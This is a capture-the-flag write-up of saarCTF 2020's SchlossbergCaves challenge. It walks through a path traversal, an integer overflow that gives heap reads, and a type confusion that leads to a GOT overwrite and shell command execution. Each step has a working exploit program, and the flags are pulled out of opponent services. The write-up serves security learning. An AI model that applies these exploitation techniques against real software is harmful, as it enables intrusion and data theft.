---
layout: post
title: saarCTF 2020 - SchlossbergCaves
description: DIY compilers are fun.
comments: true
---

This weekend, I played [saarCTF 2020](https://ctftime.org/event/980) with [NoPwnIntended](https://ctftime.org/team/36157).
We got 9th place.
This CTF was attack/defense, my favorite style, and I really enjoyed the "SchlossbergCaves" challenge, where you had to pwn a custom compiled programming language.
This was also the challenge were we got the most attack points.

I found three bugs and wrote an exploit for each.
The first two exploits were just able to leak flags, while the third one achieved remote code execution.

I mirrored the challenge files [here](/assets/ctf/saarctf20/schlossberg.tar.gz).

1. ToC
{:toc}

### Overview

The challenge shipped with several cave templates.
A user can build a cave from an existing template and populate it with treasures in random positions, which are flags for caves created by the gamebot.
Any user can visit a cave by providing a program written in a custom programming language.
The program has to navigate around the cave.
If it terminates on a treasure, the treasure's contents will be printed.

I was drawn to this challenge because the custom programming language is compiled to machine code using LLVM, and then executed.
It looked like a fun place to look for bugs.

The challenge ships the backend's source code, in `backend/src`, some program samples, in `backend/samples`, and the prebuilt binaries in `backend/build`.
The `backend/build/SaarlangCompiler` executable is a standalone compiler for the language.
It's useful for testing, but it is not used in the challenge.
The actual server is `backend/build/SchlossbergCaveServer`.
It binds to the local port 9081, and it is exposed to other teams through a nginx reverse proxy on port 9080.
I will use port 9081 in examples and exploits so that they can be tested locally without nginx.

### API interactions

The APIs are defined in `backend/src/api.cpp`.
We will take a look at a typical bot interaction.

First, we need to register a user:

```
$ curl -c cookies -X POST -H 'Content-Type: application/json' -d '{"username": "abiondo", "password": "secret"}' http://localhost:9081/api/users/register
{"username":"abiondo"}
```

This will automatically log us in (there's a `/api/users/login` endpoint for that, too).
Now we can create a new cave from a cave template:

```
$ curl -b cookies -X POST -H 'Content-Type: application/json' -d '{"name": "MyFancyCave", "template": 1}' http://localhost:9081/api/caves/rent
{"created":1584867401,"id":"1584867401_1345632849","name":"MyFancyCave","owner":"abiondo","template_id":1,"treasure_count":0,"treasures":[]}
```

And add a couple treasures (flags) to the cave in random positions:

```
$ curl -b cookies -X POST -H 'Content-Type: application/json' -d '{"cave_id": "1584867401_1345632849", "names": ["SAAR{OneFancyFlagOneFancyFlag00000000}", "SAAR{TwoFancyFlagsTwoFancyFlags000000}"]}' http://localhost:9081/api/caves/hide-treasures
{"created":1584867401,"id":"1584867401_1345632849","name":"MyFancyCave","owner":"abiondo","template_id":1,"treasure_count":2,"treasures":[{"name":"SAAR{OneFancyFlagOneFancyFlag00000000}","x":645,"y":97},{"name":"SAAR{TwoFancyFlagsTwoFancyFlags000000}","x":505,"y":14}]}
```

We can also list all existing caves without authentication:

```
$ curl -X GET http://localhost:9081/api/caves/list
[{"created":1584867401,"id":"1584867401_1345632849","name":"MyFancyCave","owner":"abiondo","template_id":1,"treasure_count":2}]
```

Next, we can visit the cave through the `/api/caves/visit` endpoint.
However, let's have a look at the custom programming language first.

### The language

The language is custom, and gets compiled through the LLVM JIT.
The typing system supports 64-bit integers (`int`), arrays of bytes (`lischd byte`), and arrays of 64-bit integer (`lischd int`).
Other notable features are import statements (`holmol`), functions (declared with `eija`, called with `mach`), and various conditional structures.

As you might have notice from the words, many keywords in this language are not English.
Fortunately, internal token names from the lexer are much easier to understand (see `backend/src/saarlang/Lexer.h`):

```cpp
keywords["holmol"] = TT_IMPORT;
keywords["const"] = TT_CONST;
keywords["eijo"] = TT_FUNCTION;
keywords["eija"] = TT_FUNCTION;
keywords["gebbtserick"] = TT_RETURNING;
keywords["serick"] = TT_RETURN;
keywords["falls"] = TT_IF;
keywords["sonschd"] = TT_ELSE;
keywords["solang"] = TT_WHILE;
keywords["var"] = TT_VAR;
keywords["mach"] = TT_CALL;
keywords["neie"] = TT_NEW;
keywords["grees"] = TT_LENGTH;
keywords["lischd"] = TT_ARRAY;
keywords["int"] = TT_INT;
keywords["byte"] = TT_BYTE;
keywords["unn"] = TT_AND;
keywords["odder"] = TT_OR;
```

You can get a good feeling for the language by looking at the samples in `backend/samples`.
I will explain languages features that are needed for each bug later on.
For now, let's work with a small sample program:

```
eija main() gebbtserick int: {
    serick 1337;
}
```

This defines a `main` function, returning `int`.
The function simply returns 1337.

Now we can use the visit API to execute this program (saved as `1337.sl`) in our cave:

```
$ curl -X POST -H 'Content-Type: application/json' -d '{"cave_id": "1584867401_1345632849", "files": {"1337.sl": "'"$(cat 1337.sl)"'"}}' http://localhost:9081/api/visit
CODE SIGNATURES: {"1337.sl":"c010f92f93aa49671552b9ed0112c1f1b0e36bb62ca2149226ed6f761dc875f7"}
--- Saarlang execution starts ---
Result: 1337
VISITED PATH: {"path":[{"x":720,"y":450}],"treasures":[]}
```

Note that this API is unauthenticated.
Any user can visit any cave, as long as they know the cave ID.
The JSON request has two fields: `cave_id`, which is the ID of the cave, and `files`, which is a dictionary that maps the name of each source file to its content.
We can send multiple source files: they will be compiled and linked together.

In the output, you can observe that the result is 1337, i.e., exactly what we returned from `main`.
If we stopped in a treasure's position, the `VISITED PATH` line would should the treasure's contents.

We can also test this through the standalone compiler in `backend/build`:

```
$ ./SaarlangCompiler 1337.sl
--- Saarlang execution starts ---
Result: 1337
```

### Bug 1: path traversal in import statements

The `holmol` statement allows to import definitions from other files.
This is used to declare function exported by the language runtime, which provide I/O and cave movement.
These libraries can be found in `backend/include`.

After the module that contains the `holmol` statement is parsed, the import resolution process kicks in (see `backend/src/saarlang/SaarlangModule.cpp`):

```cpp
void SaarlangModule::resolveImports(Diagnostic &diag, SimpleModuleLoader &loader) {
    for (auto &node: imports) {
        SaarlangModule *m = loader.load(node->filename);
        for (auto &def: m->definitions) {
            def->declare(diag, globalSymbols);
        }
    }
}
```

It loads the imported file, and declares its definitions in the global namespace.
Let's see how the file is loaded:

```cpp
SaarlangModule *SimpleModuleLoader::load(const std::string &filename) {
    auto it = modules.find(filename);
    if (it != modules.end())
        return &it->second;

    std::ifstream fileinput(basepath + filename, std::ios::in);
    if (!fileinput.is_open())
        diag.file_error(filename);
    return preload(filename, fileinput);
}
```

The module loader first looks in its cache.
If it cannot find the file there, it will read it from disk.
The path is derived as `basepath + filename`, where `basepath` is `../include` (relative to `backend/build`), and `filename` is the path in the `holmol` statement.
This is clearly vulnerable to a path traversal.
What would happen if we tried to import the cave file, where flags are held?

```
$ cat traversal.sl
holmol "../../data/caves/1584867401_1345632849";

$ ./SaarlangCompiler traversal.sl
[ERROR] lexer in ../../data/caves/1584867401_1345632849 at 2:137: Invalid character
> ,"treasure_count":2,"treasures":[{"name":"SAAR{OneFancyFlagOneFancyFlag00000000}","x":645,"y":97},{"
                                  ^
```

Clearly, the cave JSON is not valid in this language.
However, at the lexical analysis stage, all the JSON characters form valid language tokens, except for `[`, which is not part of the language.
Since `[` is used at the beginning of the treasure list, and the lexer outputs some context, the error message leaks the first flag.

There are usually multiple flags per cave, so this isn't that good, but it's an easy first exploit.
Just get all cave IDs from `/api/caves/list`, then visit all of them through `/api/caves/visit` with the path traversal file.

### Bug 2: integer overflow in array size

The language includes array support:

```
var a: lischd int = neie lischd int(123);
var b: lischd byte = neie lischd byte(456);
var x: int = a@5;
b@10 = 65;
```

In this example, `a` is an array of 123 `int` elements, and `b` is an array of 456 `byte` elements.
The `x` variable is initialized with the value of the element at index 5 in `a` (zero-based).
The element at index 10 in `b` is set to 65.

Let's see how this is implemented under the hood.
Array creation through `neie` is handled by `sl_new_array_{byte,int}` in `backend/src/saarlang/runtime_lib/array_functions.cpp`.
We will look at the `int` array:

```cpp
sl_array_int *sl_new_array_int(sl_int size) {
    sl_assert(size >= 0, "size >= 0");
    uint64_t memsize = sizeof(uint64_t) + size * sizeof(sl_int);
    sl_assert(memsize <= max_array_size, "Trying to reserve too much memory");
    used_memory += memsize;
    sl_assert(used_memory <= max_memory, "Reserving too much memory");

    auto array = (sl_array_int *) malloc(memsize);
    sl_assert(array != nullptr, "malloc() failed");
    array->length = size;
    return array;
}
```

The `sl_int` type is a 64-bit integer.
There is no check to ensure that `size * sizeof(sl_int)` (i.e., `size * 8`) does not overflow.
Therefore, by passing a `size` equal to `(1 << 64) / 8`, we can make `size * 8` overflow to zero, and `memsize` will be 8, just enough to hold the `length` field of `sl_array_int`.
Since `array->length = size`, the language's bound checks will believe that the array has `(1 << 64) / 8` elements, while its memory allocation has space for none.
This allows out-of-bounds reads and writes on the heap.

Accessing OOB data after the allocation is trivial, through indices starting from 0.
We cannot use negative indices to access data before the allocation, as the bound check will reject a negative number.
However, we can wrap the index around: to access index `-i`, we just ask for index `(1 << 64) / 8 - i`.
Unfortunately, in the code that generates the array access, the index gets converted to a 32-bit integer.
Therefore, we are only able to address +/- 2GiB from the allocation.
To understand this better, have a look at `BinaryOperatorExprNode::generateCode` and `BinaryOperatorExprNode::generateAssignCode` in `backend/src/saarlang/ast/expressions.cpp`.

So, I can read and write the heap, I'm in an A/D CTF, I want to dump more flags as soon as possible.
Mmm, flags are the cave's treasures, and the cave, along with its treasures, is loaded in the heap before the program is executed.
What's the first thing that comes to mind?

![Dump all the heap](/assets/img/saarctf20-dump-heap.jpg)

So let's do just that:

```
holmol "stdlib.sl";

eija main() gebbtserick int: {
    var a: lischd int = neie lischd int(2305843009213693952);
    var j: int = 0;
    solang j < grees a: {
        mach sahmol_ln(a@j);
        j = j + 1;
    }
}
```

We create an array `a` with a size of `(1 << 64) / 8`.
Then, we loop with `j` from 0 to the size of `a` (the size operator is `grees`), and we print each element through the `sahmol_ln` function from the standard library, which prints an `int` followed by newline.
In the exploit, we can read the quadwords printed by `sahmol_ln`, reconstruct the heap data, and scan for flags.
Once we hit unmapped memory after the heap, this will crash with a segmentation fault, but we'll still get output from the server.
Since it crashes while going forward (before wrapping around), it will only dump memory after the array allocation.
I wrote another version that goes backwards, and will crash on unmapped memory before the heap, and used both (which one gets the flag depends on where the array gets allocated).

The problem is that this generates _a lot_ of network traffic, which in turn makes it slow since most vulnboxes don't have a huge bandwidth.
Our A/D infrastructure sits on a very generous bandwidth, enough that we could just crank the parallelism knob and be done with it, but it would probably start looking like DoS.
So I wanted to do some filtering in the program to reduce network load.

A first attempt was to print `a@j` only if it is not zero: `falls a@j != 0: { mach sahmol_ln(a@j); }`.
Since the flag is ASCII, a zero quadword cannot be part of the flag, and large portions of the heap are zeroed, so it saves a lot of prints.
This was the first version of the exploit that I deployed against other teams (together with a backwards variant), and while better than no filter, it still generated a significant amount of traffic.

For the second version, I thought about pattern-matching `SAAR{`, but it was pretty painful.
Instead, I realized that I can approximately check whether a quadword is entirely made of printable characters by ANDing with 0x808080... and checking whether the result is zero.
Such a quadword could be in the middle of a flag.
We print the previous quadword (the flag might not be 8-aligned) and enough following quadwords to ensure that we dump the whole flag (38 characters):

```
holmol "stdlib.sl";

eija main() gebbtserick int: {
    var a: lischd int = neie lischd int(2305843009213693952);
    var j: int = 0;
    solang j < grees a: {
        falls (a@j unn 36170086419038336) == 0: {
            falls j > 0: { var i: int = j - 1; mach sahmol_ln(a@i); }
            mach sahmol_ln(a@j); j = j + 1;
            mach sahmol_ln(a@j); j = j + 1;
            mach sahmol_ln(a@j); j = j + 1;
            mach sahmol_ln(a@j); j = j + 1;
            mach sahmol_ln(a@j);
        }
        j = j + 1;
    }
}
```

I had to reduce the AND constant as it was aborting, probably due to an excessive integer value.
I used this (together with a backwards variant) in the second version of my exploit, and while still crude, it was good enough and reduced the traffic significantly.

### Bug 3: type confusion in function prototypes

Let's take a look at how the `sahmol_ln` function is implemented in `backend/src/saarlang/runtime_lib/stdlib_functions.cpp`:

```cpp
sl_int println(sl_int x) {
    printf("%ld\n", x);
    return 0;
}

void import_stdlib_functions(JitEngine &engine) {
    // Override with runtime library symbols
    // Use 'holmol "stdlib.sl";' to see these functions
    /* ... */
    engine.addFunction("sahmol_ln", (void *) &println);
    /* ... */
}
```

The `engine.addFunction` method adds a global symbol.
There is no notion of typing here.
What would happen if we called `sahmol_ln` with an array argument, instead of an integer?
Theoretically, since array variables store the address of the `sl_array_int` backing structure, it should leak the array address.

```
$ cat foo.sl
holmol "stdlib.sl";

eija main() gebbtserick int: {
    var a: lischd int = neie lischd int(1);
    mach sahmol_ln(a);
}

$ ./SaarlangCompiler foo.sl
[ERROR] types in proto.sl at 5:1: Incompatible types int , lischd int
>     mach sahmol_ln(a);
      ^
```

We get a type error.
The C++ code only defines the symbol name, and the actual prototype with typing information is defined in `stdlib.sl`:

```
eija sahmol_ln(x: int) gebbtserick int: {}
```

Imports are under our control, so we can write our own declaration for that function, and make the compiler believe it accepts an integer array:

```
$ cat mylib.sl
eija sahmol_ln(x: lischd int) gebbtserick int: {}

$ cat foo.sl
holmol "../build/mylib.sl";

eija main() gebbtserick int: {
    var a: lischd int = neie lischd int(1);
    mach sahmol_ln(a);
}

$ ./SaarlangCompiler foo.sl
--- Saarlang execution starts ---
18080048
Result: 0
```

That looks like a heap address!
We're still testing with the standalone compiler.
Let's try this on the server, where we can't control arbitrary files on the filesystem.

When handling a visit, the server first preloads all the source files into the `SimpleModuleLoader`.
Then, it compiles each module and links them together.
Since the files are preloaded, if we add a `mylib.sl` file to our request, we can then use `holmol "mylib.sl"` in another file.
However, when we try the leak on the server, we get not output.

Observe the `stdlib.sl` definition once again:

```
eija sahmol_ln(x: int) gebbtserick int: {}
```

The function is defined with an empty body.
This works because, when a file is imported, all the symbols it declares are added to the global namespace, but they are not actually defined, and no code is generated for them.
At linking phase, the symbol will be linked with the function exported by the runtime.
When we send both files to the server, however, code is generated for each file.
The empty-body definition of `sahmol_ln` will produce a symbol that overrides the runtime export, turning it into a no-op.
Therefore, we cannot use this trick to confuse the prototype of existing runtime functions.

However, we can confuse prototypes of functions defined by ourselves, as long as split them in three files (confused declaration, definition and usage) and get the compilation order just right:

```
$ cat z.sl
eija foo(x: int) gebbtserick int: {
    serick x;
}

$ cat import.sl
eija foo(x: lischd int) gebbtserick int: {}

$ cat entry.sl
holmol "import.sl";
holmol "stdlib.sl";

eija main() gebbtserick int: {
    var a: lischd int = neie lischd int(1);
    var b: int = mach foo(a);
    mach sahmol_ln(b);
}

$ ./exploit
CODE SIGNATURES: {"entry.sl":"0d10fd14eb2568d6557a8132af009704a507610836c6f7ca081f75d5b20b8543","import.sl":"b0c61d26bf4541d2ef3c5812e5c3ac331c787ef1894e4eac083781bb7c7752b3","z.sl":"7f5c72fee8fe6324b9a6b34daf8bc0e3945456e19fc643605e51655fde01f6aa"}
--- Saarlang execution starts ---
139910170645088
Result: 0
VISITED PATH: {"path":[{"x":720,"y":450}],"treasures":[]}
```

In `z.sl`, we define an identity function `foo`: it accept an integer and returns the integer, unchanged.
In `import.sl`, we define an empty-body `foo`, but this time it accepts an array, and returns an integer.
Finally, in `entry.sl`, we call `foo` on an array and print the returned integer.
The `exploit` script just makes the usual POST request for visit.

What's happening here?
We created a situation where `entry.sl` uses the prototype from `import.sl`, which accepts an array, but at link time the implementation from `z.sl` will be chosen.
This depends on the order in which files are compiled.
The filenames are not random: they've been chosen so that, once the request JSON is decoded to C++ maps (where the iteration order depends on the key hash), the order will be correct.

Effectively, we're confusing a `lischd int` to an `int` to leak the array address.
But we can do the opposite, and confuse an `int` to a `lischd int` (`z.sl` is unchanged):

```
$ cat import.sl
eija foo(x: int) gebbtserick lischd int: {}

$ cat entry.sl
holmol "import.sl";

eija main() gebbtserick int: {
    var a: lischd int = mach foo(1094795585);
    a@0 = 1234;
}

$ ./exploit
CODE SIGNATURES: {"entry.sl":"9f843d0683b423b90c204b2a76342978093b3dc9a14f53157a77af7d9a33254a","import.sl":"b0c61d26bf4541d2ef3c5812e5c3ac331c787ef1894e4eac083781bb7c7752b3","z.sl":"7f5c72fee8fe6324b9a6b34daf8bc0e3945456e19fc643605e51655fde01f6aa"}
--- Saarlang execution starts ---

$ dmesg | tail
[...]
[17200.393984] MHD-single[20251]: segfault at 41414141 ip 00007f3f698e501f sp 00007f3f655f1110 error 4
[17200.393988] Code: 00 00 00 00 00 00 00 00 00 00 00 c3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 50 bf 41 41 41 41 e8 1b 00 00 00 48 89 04 24 <48> 83 38 00 74 0c 48 c7 40 08 d2 04 00 00 31 c0 59 c3 e8 06 00 00
```

Now, we confused the integer 0x41414141 to an integer array, and crashed on exactly that address when trying to access it.
Note that the crash does not happen in the actual element access, but in the bounds check before it, which accesses the `length` field at the beginning of `sl_array_int`.

Confusing an integer to an array gives us arbitrary R/W capability.
By default, this binary is compiled without PIE and with partial RELRO.
I noticed that the binary imports `system` (to run the compiled code under `prlimit`), and the `sahmol_as_str` standard library function is implemented as follows:

```
sl_int println_as_str(sl_array_byte *x) {
	puts((char *) x->data);
	return 0;
}
```

Therefore, we can achieve RCE easily by overwriting the `puts` GOT entry with the address of the `system` PLT entry, and then calling `sahmol_as_str` on a byte array containg an arbitrary shell command.
We just have to make sure that the `length` field of the confused array overlaps something with a big enough value for the index we'll be using.
For example, for the command `egrep -roh 'SAAR\{[A-Za-z0-9\-_]{32}\}' ../../data/caves`:

```
$ cat entry.sl
holmol "import.sl";
holmol "stdlib.sl";

eija main() gebbtserick int: {
    var c: lischd byte = neie lischd byte(56);
    c@0=101;c@1=103;c@2=114;c@3=101;c@4=112;c@5=32;c@6=45;c@7=114;c@8=111;c@9=104;c@10=32;c@11=39;c@12=83;c@13=65;c@14=65;c@15=82;c@16=92;c@17=123;c@18=91;c@19=65;c@20=45;c@21=90;c@22=97;c@23=45;c@24=122;c@25=48;c@26=45;c@27=57;c@28=92;c@29=45;c@30=95;c@31=93;c@32=123;c@33=51;c@34=50;c@35=125;c@36=92;c@37=125;c@38=39;c@39=32;c@40=46;c@41=46;c@42=47;c@43=46;c@44=46;c@45=47;c@46=100;c@47=97;c@48=116;c@49=97;c@50=47;c@51=99;c@52=97;c@53=118;c@54=101;c@55=115;
    var a: lischd int = mach foo(5122416);
    a@0 = 4241984;
    mach sahmol_as_str(c);
}
```
